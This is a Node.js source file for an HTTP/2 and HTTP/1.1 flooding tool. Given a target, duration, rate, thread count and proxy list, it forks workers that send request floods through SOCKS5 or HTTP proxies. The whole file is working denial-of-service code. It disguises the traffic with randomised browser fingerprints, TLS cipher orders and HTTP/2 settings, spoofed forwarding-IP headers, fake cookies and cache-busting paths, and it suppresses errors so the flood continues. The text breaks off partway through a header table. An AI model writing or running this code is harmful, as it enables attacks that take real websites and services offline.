const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = import('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

 function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
    const cplist = [
       "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 6000000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP FOUND ', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 100;
const RESTART_DELAY = 1;

function getRandomHeapSize() {
    // Random t? 512MB d?n 2048MB
    const min = 8000;
    const max = 8522;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
if (cluster.isMaster) {
    console.clear();
    console.log(`PRO`.bgRed), console.log(`[!] mbs`);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1); // Gi? s? runFlooder du?c d?nh nghia v� g?i m?i gi�y
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(32768, 65536)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(4000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(262144, 393216)]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", rand(65536, 98304)],
            ["SETTINGS_ENABLE_PUSH", true],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", rand(400, 600)],
            ["SETTINGS_INITIAL_WINDOW_SIZE", rand(5000000, 6291456)],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", rand(131072, 524288)]
        ]
    };

    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
    chrome:     { min: 119, max: 126 },
    safari:     { min: 16,  max: 17 },
    brave:      { min: 1,   max: 2 },
    firefox:    { min: 114, max: 127 },
    mobile:     { min: 119, max: 126 },
    opera:      { min: 103, max: 107 },
    operagx:    { min: 103, max: 107 },
    duckduckgo: { min: 7,   max: 7 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
    brave: `${Math.floor(1 + Math.random() * 2)}.${Math.floor(61 + Math.random() * 8)}.${Math.floor(50 + Math.random() * 900)}`, // 1.61.x - 2.69.x
    chrome: `${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(1000 + Math.random() * 4000)}.0`, // 119-125
    firefox: `${Math.floor(114 + Math.random() * 10)}.0`,
    safari: `17.${Math.floor(Math.random() * 3)}`,
    mobile: `${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(1000 + Math.random() * 4000)}.0`, // Chrome Android 119–125
    opera: `${Math.floor(103 + Math.random() * 5)}.0.${Math.floor(2000 + Math.random() * 5000)}.0`, // Opera 103–107
    operagx: `${Math.floor(103 + Math.random() * 5)}.0.${Math.floor(2000 + Math.random() * 5000)}.0`, // Opera GX
    duckduckgo: "7.0"
};

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
    chrome: Math.random() < 0.6 ? "Win64" : "Linux",
    safari: "macOS",
    brave: Math.random() < 0.5 ? "Win64" : "Linux",
    firefox: Math.random() < 0.5 ? "Linux" : "Win64",
    mobile: "Android",
    opera: Math.random() < 0.5 ? "Linux" : "Win64",
    operagx: "Win64",
    duckduckgo: "macOS"
};
    const platform = platforms[browser];

    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rand(119, 125)}.0.${rand(1000, 5999)}.${rand(0, 150)} Safari/537.36`,

    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${rand(110, 127)}.0) Gecko/20100101 Firefox/${rand(110, 127)}.0`,

    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${rand(14, 15)}_${rand(0, 7)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${rand(14, 17)}.0 Safari/605.1.15`,

    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rand(119, 125)}.0.${rand(1000, 5999)}.0 Safari/537.36 OPR/${rand(103, 109)}.0.${rand(2000, 8000)}.0`,

    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rand(119, 125)}.0.${rand(1000, 5999)}.0 Safari/537.36 OPR/${rand(103, 109)}.0.${rand(2000, 8000)}.0 (Edition GX)`,

    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rand(119, 125)}.0.${rand(1000, 5999)}.0 Safari/537.36 Brave/${rand(1, 2)}.${rand(30, 55)}.${rand(50, 500)}`,

    mobile: `Mozilla/5.0 (Linux; Android ${rand(10, 14)}; SM-${rand(500, 999)}U Build/RQ${rand(1, 5)}A.${rand(210000, 231299)}.00${rand(1, 9)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rand(119, 125)}.0.${rand(1000, 5999)}.0 Mobile Safari/537.36`,

    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${rand(14, 15)}_${rand(0, 7)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${rand(14, 17)}.0 DuckDuckGo/7 Safari/605.1.15`
};
    const secFetchUser = Math.random() < 0.85 ? "?1;?1" : (Math.random() < 0.5 ? "?1" : "?0;?1");
const secChUaMobile = browser === "mobile" ? "?1" : "?0";

const acceptEncoding = Math.random() < 0.4
  ? "gzip, deflate, br, zstd"
  : (Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate");

const accept = Math.random() < 0.5
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  : (Math.random() < 0.5 ? "application/json" : "*/*");

const secChUaPlatform = [
  '"Windows"', '"Linux"', '"macOS"', '"Android"', '"iOS"'
][Math.floor(Math.random() * 5)];

const secChUaFull = Math.random() < 0.5
  ? `"Google Chrome";v="${Math.floor(119 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}", "Not.A/Brand";v="99"`
  : `"Mozilla Firefox";v="${Math.floor(114 + Math.random() * 10)}"`;

const secFetchDest = ["document", "image", "script", "style", "empty"][Math.floor(Math.random() * 5)];
const secFetchMode = ["navigate", "cors", "same-origin", "no-cors"][Math.floor(Math.random() * 4)];
const secFetchSite = ["same-origin", "cross-site", "none"][Math.floor(Math.random() * 3)];

const acceptLanguage = Math.random() < 0.4
  ? "en-US,en;q=0.9"
  : (Math.random() < 0.5
    ? "id-ID,id;q=0.9,en-US;q=0.8"
    : "en-GB,en;q=0.9,fr;q=0.8");

const acceptCharset = Math.random() < 0.7 ? "UTF-8" : (Math.random() < 0.5 ? "ISO-8859-1" : "windows-1251");

const connection = Math.random() < 0.6 ? "keep-alive" : (Math.random() < 0.5 ? "close" : "Upgrade");

const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : (Math.random() < 0.5 ? "Fetch" : undefined);

const referer = Math.random() < 0.4
  ? "https://www.google.com/"
  : (Math.random() < 0.5 ? "https://search.brave.com/" : "https://www.bing.com/");

const xForwardedFor = `${Math.floor(Math.random() * 254 + 1)}.${Math.floor(Math.random() * 254 + 1)}.${Math.floor(Math.random() * 254 + 1)}.${Math.floor(Math.random() * 254 + 1)}`;

const te = ["trailers", "gzip", "deflate"][Math.floor(Math.random() * 3)];

const cacheControl = Math.random() < 0.4
  ? "no-cache"
  : (Math.random() < 0.5 ? "max-age=0" : "max-age=" + Math.floor(Math.random() * 86400));

function getRandomPath() {
    const paths = [
        "/about", "/products", "/contact", "/news", "/services", "/portfolio",
        "/blog/post-" + Math.floor(Math.random() * 1000),
        "/article/" + Math.floor(Math.random() * 1000),
        "/category/" + Math.floor(Math.random() * 10),
        "/shop/product-" + Math.floor(Math.random() * 500),
        "/store/item-" + Math.floor(Math.random() * 1000),
        "/events/" + Math.floor(Math.random() * 200),
        "/support", "/faq",
        "/" + generateRandomString(4, 8) + "/" + generateRandomString(5, 12),
        "/" + generateRandomString(6) + ".php"
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}

function generateRandomString(min, max) {
    const length = max ? Math.floor(Math.random() * (max - min + 1)) + min : min;
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}
    const headersMap = {
  brave: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(5) + "=" + generateRandomString(10, 15) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Brave";v="${115 + Math.floor(Math.random() * 10)}", "Chromium";v="${115 + Math.floor(Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
    "sec-ch-ua-platform": `"${Math.random() < 0.5 ? "Windows" : "Android"}"`,

    "user-agent": `Mozilla/5.0 (${
      Math.random() < 0.5
        ? `Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64`
        : "Linux; Android 11; SM-G998B"
    }) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      100 + Math.random() * 50
    )}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(
      115 + Math.random() * 10
    )}.0.0.0`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.6",
    "accept-language":
      Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",

    "referer": "https://search.brave.com/",

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "fakeIp": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-gpc": "1",

    // ✔ Tambahan header valid dan kuat
    "purpose": "prefetch",
    "sec-purpose": "prefetch;prerender",
    "device-memory": `${Math.pow(2, Math.floor(Math.random() * 4 + 2))}`, // 2, 4, 8, 16
    "viewport-width": `${Math.floor(Math.random() * (1920 - 320) + 320)}`,
    "rtt": `${Math.floor(Math.random() * 300) + 50}`, // realistic RTT in ms
    "downlink": `${(Math.random() * 10).toFixed(1)}`, // Mbps as float
    "ect": ["4g", "3g", "2g", "slow-2g"][Math.floor(Math.random() * 4)],

    // Optional cookie ringan
    "cookie": `_ga=${generateRandomString(12)}; _gid=${generateRandomString(10)}; theme=dark; SID=${generateRandomString(16)}; PREF=ID${generateRandomString(8)}:FF=0:TM=${Date.now()};`
  },
  chrome: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Not.A/Brand";v="99", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(115 + Math.random() * 10)}"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": `"Windows"`,

    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      115 + Math.random() * 10
    )}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "en-GB,en;q=0.9,id-ID;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",

    "referer": "https://search.brave.com/",

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "fakeIp": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-gpc": "1",

    // Header sah & valid dari Chrome untuk fingerprint natural
    "purpose": "prefetch",
    "device-memory": `${Math.pow(2, Math.floor(Math.random() * 4 + 2))}`, // 2–16
    "rtt": `${Math.floor(Math.random() * 250) + 100}`, // 100–350ms
    "downlink": `${(Math.random() * 8 + 2).toFixed(1)}`, // 2.0–10.0 Mbps
    "ect": ["4g", "3g", "2g", "slow-2g"][Math.floor(Math.random() * 4)],

    // Opsional: cookie dasar
    "cookie": `_ga=${generateRandomString(12)}; _gid=${generateRandomString(10)}; theme=light`
  },
  safari: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(
      13 + Math.random() * 2
    )}_${Math.floor(Math.random() * 6)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(
      16 + Math.random() * 3
    )}.0 Safari/605.1.15`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "en-SG,en;q=0.8,id-ID;q=0.7",
    "accept-encoding": "gzip, deflate, br",

    "referer":
      Math.random() < 0.5
        ? "https://www.apple.com/"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
